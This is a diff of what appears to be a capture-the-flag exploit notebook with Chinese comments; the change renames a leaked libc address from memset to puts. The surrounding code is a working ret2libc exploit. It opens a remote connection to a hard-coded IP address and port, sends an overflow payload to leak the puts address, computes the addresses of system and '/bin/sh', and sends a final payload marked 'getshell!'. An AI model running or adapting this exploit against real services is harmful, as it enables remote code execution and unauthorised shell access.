@@ -137,7 +137,7 @@ sh_str_offset = next(libc.search('/bin/sh\x00')) - puts_libc
 print(hex(puts_libc))
 
 
-# 可以看到泄露的 `memset` 地址与 libc 中是对应的。  
+# 可以看到泄露的 `puts` 地址与 libc 中是对应的。  
 # 接下来就在可以远程运行 shell 命令。考虑到 ASLR 的影响，libc 的地址每次加载可能都会变化，所以地址泄露和函数调用需要在同一个进程中完成。  
 # 由于 Jupyter Notebook 不能进行交互，我们使用函数每次运行一条命令：
 
@@ -147,16 +147,16 @@ print(hex(puts_libc))
 p = remote('202.112.51.154', 20001)
 p.recv()
 
-# leak memset address
+# leak puts address
 payload = 'A' * 51 + chr(71) + p32(binary.symbols['puts']) + p32(main) + p32(puts_address_ptr)
 p.sendline(payload)
 p.recv()
 leaked_info = p.recv()
-memset_address = u32(bytes(leaked_info.splitlines()[1][0:4]))
+puts_address = u32(bytes(leaked_info.splitlines()[1][0:4]))
 
 # calculate function address
-system_address = memset_address + system_offset
-sh_str_address = memset_address + sh_str_offset
+system_address = puts_address + system_offset
+sh_str_address = puts_address + sh_str_offset
 
 # getshell!
 payload = 'A' * 51 + chr(71) + p32(system_address) + p32(main) + p32(sh_str_address)
